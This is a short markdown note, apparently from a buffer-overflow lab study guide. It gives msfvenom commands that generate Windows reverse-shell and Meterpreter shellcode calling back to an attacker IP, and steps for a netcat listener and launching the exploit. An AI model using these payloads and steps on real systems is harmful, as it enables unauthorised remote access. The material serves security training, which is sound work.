# Shellcode
---

- Now we'll make the shellcode that will call back to your listener.

- Using ***msfvenom***, make sure to include the same bad chars from before:

```bash
#NETCAT SHELL
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.170.14 LPORT=4444 EXITFUNC=thread -b "\\x00" -f c -a x86

#METERPRETER SHELL
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c lhost=10.8.170.14 lport=5555 EXITFUNC=thread -b "\\x00"
```

- This will give us a shell. Update*** LHOST, LPORT,*** and ***badchars.***

- Setup a listener  `nc -nvvlp 4444`

- Put it all in [[Exploit.py]] and launch (you did reset Immunity, right?).

- Check your listener, you should have a shell on the victim Windows machine.

- If you don't, it's ok. Try again from the top.